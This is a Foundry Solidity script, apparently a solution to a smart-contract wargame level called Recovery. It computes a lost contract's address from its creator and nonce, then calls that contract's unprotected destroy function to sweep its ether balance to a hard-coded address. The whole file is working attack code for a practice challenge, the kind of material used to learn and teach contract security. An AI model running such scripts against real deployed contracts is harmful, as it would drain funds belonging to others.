// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {SimpleToken} from "../src/Recovery.sol";


contract AttackScript is Script {

    SimpleToken simpleToken;

    function run() public {

        vm.startBroadcast(); 

        address instanceContract = 0x6EDEfF9D324ee3872c6A43c5B70D7D644B3567dD;
        
        address lostcontract = 
            address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), instanceContract, bytes1(0x01))))));


        console2.log("Initial instanceContract.balance =", lostcontract.balance);

        console2.log("lostContract2 =", lostcontract);

        simpleToken = SimpleToken(payable(lostcontract));

        simpleToken.destroy(payable(0x5134FCA2Ce708AEf8672ffB6561288ee81E30543));

        console2.log("Initial instanceContract.balance =", lostcontract.balance);
        // console2.log("msg.sender =", msg.sender);

        vm.stopBroadcast();
   
    }
}

